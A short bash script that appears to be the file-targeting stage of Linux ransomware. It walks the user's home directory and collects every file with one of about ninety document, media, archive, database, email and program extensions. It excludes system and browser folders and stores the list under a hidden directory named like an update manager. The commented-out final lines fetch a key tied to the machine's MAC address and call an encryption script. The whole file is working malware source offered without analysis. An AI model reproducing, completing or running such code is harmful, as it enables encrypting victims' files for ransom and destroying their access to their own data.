#!/bin/bash
extensions=".jpg,.gif,.png,.pdf,.doc,.docx,.html,.htm,.css,.js,.xls,.xlsx,.xlsm,.txt,.avchd,.ppt,.pptx,.opd,.m4a,.mp3,.odt,.aif,.cda,.mid,.midi,.mpa,.ogg,.wav,.wma,.wpl,.7z,.arj,.deb,.pkg,.rar,.rpm,.tar.gz,.zip,.dmg,.iso,.toast,.vcd,.csv,.dat,.db,.dbf,.log,.mdb,.sav,.sql,.tar,.xml,.email,.eml,.emlx,.msg,.oft,.ost,.pst,.vcf,.apk,.bat,.bin,.cgi,.com,.exe,.gadget,.msi,.wsf,.jpeg,.ico,.php,.xhtml,.ods,.3g2,.avi,.flv,.h264,.m4v,.mkv,.mov,.mp4,.mpg,.mpeg,.rm,.swf,.vob,.wmv,.rtf,.tex,.wpd"
Field_Separator=$IFS
IFS=,
echo -n "" > /home/$(whoami)/.config/updateMGR/log_output
for val in $extensions;
do
find /home/$(whoami) | grep $val"$" >> /home/$(whoami)/.config/updateMGR/log_output
cat /home/$(whoami)/.config/updateMGR/log_output | grep -v ".config" > /home/$(whoami)/.config/updateMGR/temp
cat /home/$(whoami)/.config/updateMGR/temp > /home/$(whoami)/.config/updateMGR/log_output
cat /home/$(whoami)/.config/updateMGR/log_output | grep -v ".local" > /home/$(whoami)/.config/updateMGR/temp
cat /home/$(whoami)/.config/updateMGR/temp > /home/$(whoami)/.config/updateMGR/log_output
cat /home/$(whoami)/.config/updateMGR/log_output | grep -v ".cache" > /home/$(whoami)/.config/updateMGR/temp
cat /home/$(whoami)/.config/updateMGR/temp > /home/$(whoami)/.config/updateMGR/log_output
cat /home/$(whoami)/.config/updateMGR/log_output | grep -v "snap" > /home/$(whoami)/.config/updateMGR/temp
cat /home/$(whoami)/.config/updateMGR/temp > /home/$(whoami)/.config/updateMGR/log_output
cat /home/$(whoami)/.config/updateMGR/log_output | grep -v "snap-store" > /home/$(whoami)/.config/updateMGR/temp
cat /home/$(whoami)/.config/updateMGR/temp > /home/$(whoami)/.config/updateMGR/log_output
cat /home/$(whoami)/.config/updateMGR/log_output | grep -v ".mozilla" > /home/$(whoami)/.config/updateMGR/temp
cat /home/$(whoami)/.config/updateMGR/temp > /home/$(whoami)/.config/updateMGR/log_output
cat /home/$(whoami)/.config/updateMGR/log_output | grep -v ".mysql" > /home/$(whoami)/.config/updateMGR/temp
cat /home/$(whoami)/.config/updateMGR/temp > /home/$(whoami)/.config/updateMGR/log_output
cat /home/$(whoami)/.config/updateMGR/log_output | grep -v ".pki" > /home/$(whoami)/.config/updateMGR/temp
cat /home/$(whoami)/.config/updateMGR/temp > /home/$(whoami)/.config/updateMGR/log_output 
done
# identifier_key=`cat /sys/class/net/*/address| tr '\n' ':'`
# secret_key=`python3  prf_server_code.py identifier_key`
# python3 /home/$(whoami)/.config/updateMGR/encrypt.py
#IFS=$Field_Separator
#dont select those files which are in ".config",".local",".cache","snap","snap-store",".mozilla",".mysql",".pki",
